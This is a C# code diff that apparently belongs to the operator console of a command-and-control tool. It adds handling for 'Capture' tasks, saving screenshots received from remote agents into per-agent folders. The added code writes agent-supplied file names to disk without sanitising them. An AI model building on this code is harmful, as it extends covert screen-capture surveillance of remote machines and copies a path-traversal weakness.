@@ -1,4 +1,5 @@
-﻿using Commander.Commands;
+﻿using BinarySerializer;
+using Commander.Commands;
 using Commander.Communication;
 using Commander.Helper;
 using Commander.Models;
@@ -121,6 +122,26 @@ namespace Commander.Executor
 
             this.Terminal.Interrupt();
             TaskPrinter.Print(task, res, this.Terminal);
+
+            if(task.CommandId == CommandId.Capture)
+            {
+                if (res.Objects == null || res.Objects.Length == 0)
+                    return;
+                var list = res.Objects.BinaryDeserializeAsync<List<DownloadFile>>().Result;
+
+                if (!Directory.Exists("media"))
+                    Directory.CreateDirectory("media");
+
+                var path = Path.Combine("media", task.AgentId);
+                if (!Directory.Exists(path))
+                    Directory.CreateDirectory(path);
+
+                foreach (var file in list)
+                {
+                    File.WriteAllBytes(Path.Combine(path,file.FileName), file.Data);
+                    this.Terminal.WriteInfo($"Screenshot saved : {file.FileName}.");
+                }
+            }
             /*foreach (var file in res.Files.Where(f => !f.IsDownloaded))
             {
                 bool first = true;
